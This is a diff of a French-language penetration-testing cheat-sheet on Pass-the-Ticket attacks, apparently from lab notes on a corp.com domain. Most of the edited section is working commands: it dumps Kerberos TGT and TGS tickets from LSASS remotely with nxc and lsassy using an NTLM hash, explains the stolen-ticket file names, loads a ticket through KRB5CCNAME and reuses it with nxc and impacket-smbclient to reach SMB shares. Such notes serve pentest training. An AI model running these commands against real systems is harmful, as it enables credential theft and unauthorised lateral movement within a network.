@@ -186,32 +186,26 @@ Voler un TGT ou TGS depuis la mémoire LSASS d'une machine et l'utiliser dans un
 
 **Linux (nxc + lsassy)**
 
+1. Extraire les tickets de LSASS à distance
 ```bash
-# 1. Extraire les tickets de LSASS à distance
 nxc smb <IP_CIBLE> -u <user> -H <NTLM_HASH> -M lsassy
-# → tickets sauvegardés dans ~/.nxc/modules/lsassy/
-# Format : TYPE_DOMAINE_USER_SERVICE_CIBLE_ID_IP_TIMESTAMP.ccache
 ```
 
+2. Choisir et charger le ticket
 ```bash
-# 2. Choisir et charger le ticket
+ls -l ~/.nxc/modules/lsassy/
 # Format des fichiers : TYPE_DOMAINE_USER_SERVICE_CIBLE_ID_IP_TIMESTAMP.ccache
-#
-# TGT_CORP.COM_dave_krbtgt_CORP.COM_099be531_192.168.190.76_20260514.ccache
-#  │    │        │    │       │        │         │
-#  │    │        │    │       │        ID unique  IP source
-#  │    │        │    Service (krbtgt = TGT)
-#  │    │        User dont le ticket a été volé
-#  TGT ou TGS    Domaine
-#
+
 # TGS_CORP.COM_dave_cifs_web04_[...].ccache  → accès SMB à web04
 # TGS_CORP.COM_dave_ldap_dc1_[...].ccache   → accès LDAP au DC
 # TGT_CORP.COM_dave_krbtgt_[...].ccache     → TGT réutilisable pour tout service
-export KRB5CCNAME='/home/kali/.nxc/modules/lsassy/TGS_CORP.COM_dave_cifs_web04_[...].ccache'
 
-# 3. Utiliser le ticket
-impacket-smbclient -k -no-pass corp.com/dave@web04.corp.com -target-ip <IP_WEB04> --kdcHost <IP_DC>
-nxc smb <IP_CIBLE> -u dave -k --use-kcache --kdcHost <IP_DC>
+export KRB5CCNAME='/home/kali/.nxc/modules/lsassy/TG[...].ccache'
+```
+
+3. Utiliser le ticket
+```bash
+nxc smb <IP_CIBLE> -u <user> -k --use-kcache --kdcHost <IP_DC>
 ```
 
 **Windows (Mimikatz)**
